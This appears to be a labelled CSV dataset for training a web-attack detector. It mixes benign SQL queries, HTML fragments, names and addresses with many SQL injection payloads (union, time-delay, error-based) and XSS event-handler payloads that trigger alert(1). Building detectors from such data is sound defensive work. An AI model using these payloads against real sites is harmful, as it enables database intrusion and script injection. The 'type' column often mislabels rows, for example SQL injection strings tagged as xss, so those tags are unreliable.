Text,Label,type
45738,0,sql
"<br onkeydown=""alert(1)"" contenteditable>test</br>",2,xss
SELECT * FROM troops FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"<rt onmouseleave=""alert(1)"">test</rt>",2,xss
SELECT * FROM package WHERE slip = 'dozen'  AND City = 'palace',0,sql
tors,0,sql
SELECT whose ( s )  FROM hat,0,xss
SELECT kind FROM avoid UNION SELECT hurt FROM fastened ORDER BY fort,0,sql
"<style>@keyframes slidein {}</style><ol style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ol>",2,xss
SELECT paragraph FROM carry,0,xss
"-4669' union all select 9387,9387,9387,9387,9387,9387,9387,9387,9387,9387--",1,sql
	 </span> </li>,0,xss
"<video autoplay controls onpause=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",2,xss
"1""  )   where 6018  =  6018 and 7533  =  7533--",1,sql
"<div onkeypress=""alert(1)"" contenteditable>test</div>",2,xss
SELECT COUNT ( seedID ) FROM return,0,sql
29283698y,0,sql
"	 <div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/Template:Computer_science"" title=""Template:Computer science""><abbr title=""View this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/Template_talk:Computer_science"" title=""Template talk:Computer science""><abbr title=""Discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Template:Computer_science&amp;action=edit""><abbr title=""Edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",0,xss
SELECT * FROM hello FETCH FIRST 3 ROWS ONLY,0,sql
7.63602E+15,0,sql
paula,0,xss
"1%""   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   ""%""  =  """,1,sql
 and 1 in   (  select var from temp  )  --,1,xss
"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",1,xss
%2A%28%7C%28mail%3D%2A%29%29,1,sql
SELECT AVG ( whole ) FROM hurt,0,sql
"<progress onbeforecut=""alert(1)"" contenteditable>test</progress>",2,xss
"<style>@keyframes slidein {}</style><acronym style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></acronym>",2,xss
bakkum,0,sql
"iif  (  4836  =  1823,1,1/0  )  ",1,sql
"-9758'+  (  select 'rlcy' where 3691  =  3691 union all select 3691,3691,3691,3691,3691,3691,3691--",1,sql
"<li><a href=""/wiki/Idealism"" title=""Idealism"">Idealism </a> </li>",0,xss
<picture id=x tabindex=1 onbeforeactivate=alert(1)></picture>,2,xss
"<style>:target {color:red;}</style><th id=x style=""transition:color 1s"" ontransitionend=alert(1)></th>",2,xss
 </li>,0,xss
SELECT AVG ( for ) FROM putting SELECT SUM ( season ) ,0,xss
silvita,0,sql
neusy,0,sql
<image src=validimage.png onload=alert(1)>,2,xss
1980,0,sql
"-9509  )   union all select 1193,1193,1193#",1,xss
fermentadora,0,xss
" </div> </td> </tr><tr><td class=""navbox-abovebelow"" colspan=""2"">",0,xss
"  SELECT poolID AS ID, constantly AS airplane FROM hunt",0,xss
	 </span> </h2>,0,xss
777t1c4rio,0,sql
SELECT * FROM wp_users WHERE ID  =  '1' LIMIT 1,0,sql
SELECT Count ( * )  AS introduced,0,sql
lacey@bwds.mp,0,sql
"<li><a href=""/wiki/Explanatory_power"" title=""Explanatory power"">Explanatory power </a> </li>",0,xss
"<mark onpaste=""alert(1)"" contenteditable>test</mark>",2,xss
SELECT COUNT ( essential ) FROM jack,0,sql
	 </span></a></dt><dd>Customize how pages get requested and downloaded.</dd>,0,xss
"<spacer onmouseleave=""alert(1)"">test</spacer>",2,xss
82452687x,0,sql
34475,0,sql
"<slot oncopy=""alert(1)"" contenteditable>test</slot>",2,xss
peine3@psychominders.gob,0,sql
"<li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;211–239 </li>",0,xss
anamary,0,sql
"1""   )    )    as ynuw where 9138  =  9138",1,sql
6.3087E+15,0,sql
"virgen de los imposibles 162,",0,sql
"   SELECT Employees.means, COUNT ( Orders.actuallyID )  AS hurryFROM    ( OrdersINNER JOIN effort ON Orders.appliedID  =  Employees.tankID ) ",0,sql
"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'ngxz'  =  'ngxz",1,sql
veracruz,0,sql
"   SELECT decide, cattle, daughter FROM ants WHERE organization  IS NULL",0,sql
"-2448%""  )   or 3038  =  3038",1,sql
"<i onmousemove=""alert(1)"">test</i>",2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"  SELECT circle,father,us FROM avoid LEFT JOIN Orders ON different.representID =  spoken.putting ORDER BY chance.rice",0,sql
SELECT COUNT ( typicalID ) FROM average,0,sql
millot_power@guejos.sv,0,sql
"1,  (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4250  =  4250  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ",1,sql
"-2007' where 9157  =  9157 union all select 9157,9157,9157,9157,9157,9157,9157,9157,9157#",1,sql
28820,0,sql
"-9996' or make_set  (  1237  =  7111,7111  )  ",1,sql
"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xwsb'  =  'xwsb",1,sql
	 </span></a></dt><dd>Test your extraction code in an interactive environment.</dd>,0,xss
"1""   )    )    as vxkn where 2443  =  2443 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
SELECT * FROM effort 3 SELECT * FROM band,0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><track id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></track>",2,xss
"  SELECT MOD ( 18, 4 ) ;",0,xss
tindall-bourne@pintandomucho.cg,0,sql
-3566%' or 2158  =  6289,1,xss
<th id=x tabindex=1 onbeforedeactivate=alert(1)></th><input autofocus>,2,xss
1'  )   as mwpp where 6192  =  6192,1,sql
"<li id=""cite_note-AI_in_2000s-13""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-AI_in_2000s_13-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-AI_in_2000s_13-1""><sup><i><b>b </b> </i> </sup> </a> <a href=""#cite_ref-AI_in_2000s_13-2""><sup><i><b>c </b> </i> </sup> </a> ",0,xss
"carretera aeropuerto, 42,",0,sql
"1%"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""%""  =  """,1,sql
SELECT third ( s )  FROM about FULL OUTER JOIN,0,sql
"<map onkeydown=""alert(1)"" contenteditable>test</map>",2,xss
1'||  (  select 'sbft' where 8748  =  8748,1,xss
	 </span></a></dt><dd>Post-process and store your scraped data.</dd>,0,xss
	 </span>,0,xss
"c/ peru, 85, 10?h",0,sql
	 </span> </h3>,0,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
1%'   )    )    and 7533  =  7533 and    (    (   '%'  =  ',1,xss
<menuitem id=x tabindex=1 onbeforedeactivate=alert(1)></menuitem><input autofocus>,2,xss
SELECT * FROM sport WHERE joy  BETWEEN 10 AND 20,0,xss
"1""  )   as jask where 7629  =  7629 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dialog id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dialog>",2,xss
<param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>,2,xss
"1%'   )    )     )   union all select null,null--",1,sql
SELECT * FROM interest WHERE composed = 'box'  OR support = 'quick',0,sql
"	 </span>. Englewood Cliffs, N.J.: Prentice-Hall. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-13-165449-5"" title=""Special:BookSources/978-0-13-165449-5""><bdi>978-0-13-165449-5 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Computation%3A+Finite+and+Infinite+Machines&amp;rft.place=Englewood+Cliffs%2C+N.J.&amp;rft.pub=Prentice-Hall&amp;rft.date=1967&amp;rft.isbn=978-0-13-165449-5&amp;rft.aulast=Minsky&amp;rft.aufirst=Marvin&amp;rft_id=https%3A%2F%2Farchive.org%2Fdetails%2Fcomputationfinit0000mins&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
hoyo higueron 32 3-f,0,sql
"<ul><li><a href=""/w/index.php?title=Grey_Wolf_Optimizer&amp;action=edit&amp;redlink=1"" class=""new"" title=""Grey Wolf Optimizer (page does not exist)"">Grey Wolf Optimizer </a> </li>",0,xss
"1%""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1,xss
	 </span> </a> </li>,0,xss
"<style>@keyframes slidein {}</style><rt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rt>",2,xss
"-3151%""   )    )     )   union all select 6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",1,sql
"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""jcgh""  =  ""jcgh",1,sql
SELECT * FROM slowly WHERE    NOT stepped = 'able',0,sql
"  SELECT hiddenID AS ID, aid AS fell FROM bet",0,xss
"<colgroup draggable=""true"" ondragstart=""alert(1)"">test</colgroup>",2,xss
SELECT * FROM strong WHERE event = 'obtain'  OR phrase = 'daughter',0,xss
SELECT AVG ( plan ) FROM aboard,0,sql
"1"" where 2452  =  2452",1,sql
"calle juana ibarborou 134,",0,sql
2.84001E+15,0,sql
"   SELECT thank, settle, gift FROM community WHERE stranger  IS NULL",0,xss
3.89139E+15,0,xss
"<li><a href=""/wiki/Mental_representation"" title=""Mental representation"">Representational </a> </li>",0,xss
abietceo,0,sql
"<noembed draggable=""true"" ondragend=""alert(1)"">test</noembed>",2,xss
<center onblur=alert(1) tabindex=1 id=x></center><input autofocus>,2,xss
SELECT cloth FROM kept,0,sql
"<li><a href=""/wiki/Epicureanism"" title=""Epicureanism"">Epicureans </a> </li> </ul>",0,xss
SELECT * FROM couple WHERE herself  BETWEEN 10 AND 20,0,sql
"<nobr ondblclick=""alert(1)"">test</nobr>",2,xss
<table id=x tabindex=1 ondeactivate=alert(1)></table><input id=y autofocus>,2,xss
"  UPDATE shells SET college =  'part', City =  'valuable' WHERE his =  triangle",0,sql
"<thead onpaste=""alert(1)"" contenteditable>test</thead>",2,xss
SELECT valuable ( s )  FROM sport,0,sql
op0o62i4,0,sql
-1280'   )    )    or 8571  =  8571--,1,sql
	 </span> </li>,0,xss
DELETE FROM win,0,sql
"<hr onmousedown=""alert(1)"">test</hr>",2,xss
"<li>if a move ""forks"" to create two threats at once, play that move. Otherwise, </li>",0,xss
"1%""   )    )    and 1083  =  6202",1,sql
anjali,0,sql
"	 <div style=""padding:0em 0.25em"">",0,xss
-6722'  )   order by 1#,1,sql
SELECT tears FROM whistle,0,sql
"<applet oncopy=""alert(1)"" contenteditable>test</applet>",2,xss
SELECT * FROM create  WHERE heading = send,0,sql
1'+  (  select ejaj where 1651  =  1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',1,xss
"	 </span> <span class=""reference-text"">",0,xss
"<time onmouseenter=""alert(1)"">test</time>",2,xss
"INSERT INTO more  ( relationship, why, hand )  VALUES  ( 'empty', 'expect', 'war' )  ",0,sql
"-7499%""  )   union all select 1893,1893,1893,1893,1893#",1,sql
5i852469,0,sql
  )   or sleep  (  __TIME__  )    =  ',1,xss
"   SELECT important,bottom,activity,length,team     (  (  from JOIN eleven ON exist.active =  rate.should )   INNER JOIN protectionON Orders.badly =  than.awareID ) ",0,xss
"<div role=""navigation"" aria-labelledby=""sister-projects"" class=""metadata plainlinks sistersitebox plainlist mbox-small"" style=""border:1px solid #aaa; padding:0; background:#f9f9f9;"">",0,xss
SELECT * FROM system  WHERE satisfied NOT LIKE '[enter]%',0,sql
"1'  )   as omtb where 1183  =  1183 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
SELECT * FROM call WHERE behind = 'gulf'  OR refer = 'hot',0,sql
SELECT TOP 50 PERCENT * FROM tin SELECT * FROM here FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM result,0,sql
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
denice,0,xss
" select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",1,sql
1   )    )    as uadn where 9588  =  9588 rlike sleep  (  5  )  #,1,sql
SELECT * FROM  ( SELECT original FROM wall ) ,0,sql
1750,0,sql
"<li><a href=""/wiki/Decision_support_system"" title=""Decision support system"">Decision support system </a> </li>",0,xss
SELECT COUNT ( climate )  FROM attack,0,sql
"<link onmouseenter=""alert(1)"">test</link>",2,xss
select   (  case when   (  4393  =  2875  )   then 1 else 4393*  (  select 4393 from master..sysdatabases  )   end  )  --,1,xss
-4572'  )   union all select 3520--,1,xss
<var onpointerenter=alert(1)>XSS</var>,2,xss
"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",1,xss
kofoed@serviconlevante.mr,0,sql
"<li><a href=""/wiki/Health_informatics"" title=""Health informatics"">Computational healthcare </a> </li>",0,xss
"<style>@keyframes x{}</style><basefont style=""animation-name:x"" onanimationstart=""alert(1)""></basefont>",2,xss
"<sup onkeydown=""alert(1)"" contenteditable>test</sup>",2,xss
<dialog id=x tabindex=1 onactivate=alert(1)></dialog>,2,xss
"marcelino suarez 39,",0,sql
SELECT * FROM vowel  WHERE soil = giving,0,sql
 </li>,0,xss
<ruby onpointerout=alert(1)>XSS</ruby>,2,xss
"<li id=""cite_note-Optimization_search-190""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Optimization_search_190-0"">^ </a> </b> ",0,xss
SELECT MIN ( just )  AS second FROM solar,0,sql
"  SELECT surfaceID AS ID, should AS immediately FROM afternoon",0,sql
"<br oncut=""alert(1)"" contenteditable>test</br>",2,xss
chabrat,0,sql
" SELECT column_name ( s )  FROM follow,likely",0,sql
gunderso,0,xss
SELECT COUNT ( wrappedID ) FROM upward,0,sql
"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'edcm' like 'edcm",1,sql
"<b onmousemove=""alert(1)"">test</b>",2,xss
"1"" union all select null,null,null--",1,sql
"-8608"" or 5460  =  4461--",1,sql
SELECT * FROM poetry,0,sql
SELECT * FROM car WHERE won IN  ( SELECT silver FROM general ) ,0,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Machine_learning"" title=""Machine learning"">Machine learning </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
 </li>,0,xss
"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'nlky' like 'nlky",1,sql
	 </span></a></dt><dd>Check how Scrapy performs on your hardware.</dd>,0,xss
chilches/xilxes,0,xss
"<br onmouseleave=""alert(1)"">test</br>",2,xss
SELECT * FROM garage WHERE Price NOT BETWEEN 10 AND 20,0,xss
SELECT AVG ( plenty ) FROM serious SELECT SUM ( suggest ) ,0,sql
"alcalde esteban minguez, 169, 12?b",0,sql
amedee@spainbb.cc,0,sql
eu,0,sql
"<p>AI is relevant to any intellectual task.<sup id=""cite_ref-FOOTNOTERussellNorvig20091_289-0"" class=""reference""><a href=""#cite_note-FOOTNOTERussellNorvig20091-289"">&#91;278&#93; </a> </sup> Modern artificial intelligence techniques are pervasive<sup id=""cite_ref-:1_290-0"" class=""reference""><a href=""#cite_note-:1-290"">&#91;279&#93; </a> </sup> and are too numerous to list here. Frequently, when a technique reaches mainstream use, it is no longer considered artificial intelligence; this phenomenon is described as the <a href=""/wiki/AI_effect"" title=""AI effect"">AI effect </a>.<sup id=""cite_ref-FOOTNOTE&#39;&#39;CNN&#39;&#39;2006_291-0"" class=""reference""><a href=""#cite_note-FOOTNOTE&#39;&#39;CNN&#39;&#39;2006-291"">&#91;280&#93; </a> </sup>",0,xss
1  )   where 2940  =  2940,1,sql
"<style>@keyframes slidein {}</style><select style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></select>",2,xss
"SELECT WEEKDAY ( ""2017-01-01"" ) ;",0,sql
"1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  -- ivku",1,sql
SELECT Count ( * )  AS discover,0,sql
"<rp onmouseenter=""alert(1)"">test</rp>",2,xss
"<a href=""/wiki/Transhumanism"" title=""Transhumanism"">Transhumanism </a>:",0,xss
"<li><a href=""/wiki/Functionalism_(philosophy_of_mind)"" title=""Functionalism (philosophy of mind)"">Functionalism </a> </li>",0,xss
"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz",1,sql
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;15, 940 </li>",0,xss
<blink id=x tabindex=1 onactivate=alert(1)></blink>,2,xss
SELECT * FROM national WHERE salt NOT LIKE '[bite]%',0,sql
<main id=x tabindex=1 onfocusin=alert(1)></main>,2,xss
SELECT * FROM fill FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
;s,1,sql
SELECT TOP 50 PERCENT * FROM say,0,sql
"<ul><li><a href=""#CITEREFWasonShapiro1966"">Wason &amp; Shapiro (1966) </a> showed that people do poorly on completely abstract problems, but if the problem is restated to allow the use of intuitive <a href=""/wiki/Social_intelligence"" title=""Social intelligence"">social intelligence </a>, performance dramatically improves. (See <a href=""/wiki/Wason_selection_task"" title=""Wason selection task"">Wason selection task </a>) </li>",0,xss
SELECT * FROM now  WHERE therefore NOT LIKE '[learn]%',0,xss
1' in boolean mode  ) ,1,sql
8.40007E+15,0,sql
1'   )    )     )   and 7533  =  7533 and    (    (     (  'suzd' like 'suzd,1,xss
SELECT * FROM ever WHERE setting LIKE '%clean%',0,sql
"1  )   and make_set  (  8403  =  8403,8899  )   and   (  9761  =  9761",1,sql
"<li id=""cite_note-Neats_vs._scruffies-17""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Neats_vs._scruffies_17-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Neats_vs._scruffies_17-1""><sup><i><b>b </b> </i> </sup> </a> <a href=""#cite_ref-Neats_vs._scruffies_17-2""><sup><i><b>c </b> </i> </sup> </a> ",0,xss
"1""   )    )    union all select null,null,null,null#",1,sql
"Uninformed searches (<a href=""/wiki/Breadth_first_search"" class=""mw-redirect"" title=""Breadth first search"">breadth first search </a>, <a href=""/wiki/Depth_first_search"" class=""mw-redirect"" title=""Depth first search"">depth first search </a> and general <a href=""/wiki/State_space_search"" title=""State space search"">state space search </a>):",0,xss
<bgsound id=x tabindex=1 onfocus=alert(1)></bgsound>,2,xss
"1'  )   union all select null,null,null,null,null,null,null,null--",1,sql
22200,0,sql
"   SELECT Employees.ready, COUNT ( Orders.abilityID )  AS usualFROM    ( OrdersINNER JOIN lady ON Orders.wholeID  =  Employees.everythingID ) ",0,sql
jose cadalso s/n 7d,0,sql
"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",1,xss
	 </span>,0,xss
"	 </span> <span class=""reference-text"">Wallach, pp 37–54. ",0,xss
natal,0,xss
74,0,sql
"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'ylql' like 'ylql",1,sql
<listing onpointerup=alert(1)>XSS</listing>,2,xss
	 </span>,0,xss
"-1425""  )   where 8056  =  8056 or elt  (  1032  =  1032,3623  )  --",1,sql
"c/ nueva fuera, 139 3?g",0,xss
elda,0,sql
SELECT * FROM important WHERE news  BETWEEN 10 AND 20,0,xss
SELECT * FROM grandmother WHERE spring = 'trick'  OR trap = 'expect',0,sql
"<li id=""cite_note-371""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-371"">^ </a> </b> ",0,xss
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,sql
	 </span>,0,xss
SELECT twice,0,sql
yaser,0,sql
1'  )   as ibaw where 2130  =  2130 and 9198  =  9198--,1,xss
<svg><select onload=alert(1)></select>,2,xss
"<acronym onclick=""alert(1)"">test</acronym>",2,xss
"SELECT DAYOFMONTH ( ""2017-06-15 09:34:21"" ) ;",0,sql
"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""uqyb""  =  ""uqyb",1,sql
"<section oncontextmenu=""alert(1)"">test</section>",2,xss
"<table onkeyup=""alert(1)"" contenteditable>test</table>",2,xss
zahira,0,sql
"  SELECT product AS wonder, connected AS [herd]  FROM lunch",0,sql
"   SELECT copy, continued, futureFROM apartment WHERE growth  IS NOT NULL",0,sql
SELECT minerals ( s )  FROM folks LEFT JOIN,0,xss
SELECT Count ( * )  AS company,0,sql
SELECT * FROM simply ORDER BY desk DESC,0,xss
hus24lero,0,sql
1'||  (  select 'ifts' from dual where 6329  =  6329,1,sql
SELECT * FROM Customers WHERE Country = 'Germany' FETCH FIRST 3 ROWS ONLY;,0,sql
"1"" where 2462  =  2462 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,xss
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.ID  =  27990 AND wp_posts.post_type  =  'page' ORDER BY wp_posts.post_date DESC,0,sql
"		<li id=""footer-places-mobileview""><a href=""//en.m.wikipedia.org/w/index.php?title=Artificial_intelligence&amp;mobileaction=toggle_view_mobile"" class=""noprint stopMobileRedirectToggle"">Mobile view </a> </li>",0,xss
SELECT acres ( s ) FROM necessary INNER JOIN,0,sql
SELECT * FROM bicycle WHERE slabs = 'position'  OR breathe = 'settlers',0,xss
"  <link rel=""stylesheet"" href=""_static/css/theme.css"" type=""text/css"" />",0,xss
"<?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""> <?import namespace=""t"" implementation=""#default#time2""> <t:set attributeName=""innerHTML"" to=""<SCRIPT DEFER>alert("""")</SCRIPT>"">",2,xss
"<li><a href=""/wiki/BEAM_robotics"" title=""BEAM robotics"">BEAM robotics </a> </li>",0,xss
1'||  (  select 'gnil' from dual where 7552  =  7552 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  ||',1,sql
-3937   )    )    or 3038  =  3038,1,sql
steele,0,sql
SELECT * FROM inch FETCH FIRST 3 ROWS ONLY,0,sql
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
1.94E+15,0,sql
SELECT * FROM them FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
rohtert,0,xss
"<small oncut=""alert(1)"" contenteditable>test</small>",2,xss
"document.getElementsByName("""")",2,xss
SELECT * FROM shut WHERE larger NOT LIKE 'full%',0,sql
"<style>@keyframes slidein {}</style><audio style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></audio>",2,xss
"<li><a href=""/wiki/Materialism"" title=""Materialism"">Materialism </a> </li>",0,xss
horgan,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",1,sql
"<legend onpaste=""alert(1)"" contenteditable>test</legend>",2,xss
<shadow id=x tabindex=1 onbeforeactivate=alert(1)></shadow>,2,xss
select * from users where id  =  1 <@$_ or 1  =  1 -- 1,1,sql
4.85943E+15,0,xss
"-5130'   )    )    union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",1,sql
DELETE FROM remove,0,sql
<param id=x tabindex=1 onfocus=alert(1)></param>,2,xss
"<link onbeforecopy=""alert(1)"" contenteditable>test</link>",2,xss
dowson@sehimaco.eg,0,sql
	 </span>(1920s) </li>,0,xss
SELECT * FROM minute WHERE story = 'student'  AND City = 'bill',0,sql
"<template onkeyup=""alert(1)"" contenteditable>test</template>",2,xss
"1' where 9003  =  9003 and make_set  (  5868  =  8316,8316  )  --",1,sql
"<svg draggable=""true"" ondragend=""alert(1)"">test</svg>",2,xss
SELECT * FROM anywhere WHERE stick = 'bit'  AND City = 'mine',0,sql
select * from users where id  =  1 + \+%$ or 1  =  1 -- 1,1,xss
SELECT * FROM sit,0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><cite id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></cite>",2,xss
<td onpointerover=alert(1)>XSS</td>,2,xss
" select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",1,xss
<frameset onpointermove=alert(1)>XSS</frameset>,2,xss
DELETE FROM slightly,0,sql
<optgroup onpointerleave=alert(1)>XSS</optgroup>,2,xss
